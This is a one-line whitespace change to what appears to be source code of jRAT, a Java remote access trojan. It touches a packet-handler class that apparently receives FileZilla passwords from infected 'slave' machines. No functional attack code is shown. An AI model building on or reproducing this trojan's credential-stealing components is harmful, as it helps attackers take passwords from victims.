@@ -6,7 +6,6 @@ import pro.jrat.Slave;
 import pro.jrat.ui.frames.FrameControlPanel;
 import pro.jrat.ui.panels.PanelControlFileZilla;
 
-
 public class Packet48FileZillaPassword extends AbstractIncomingPacket {
 
 	@Override
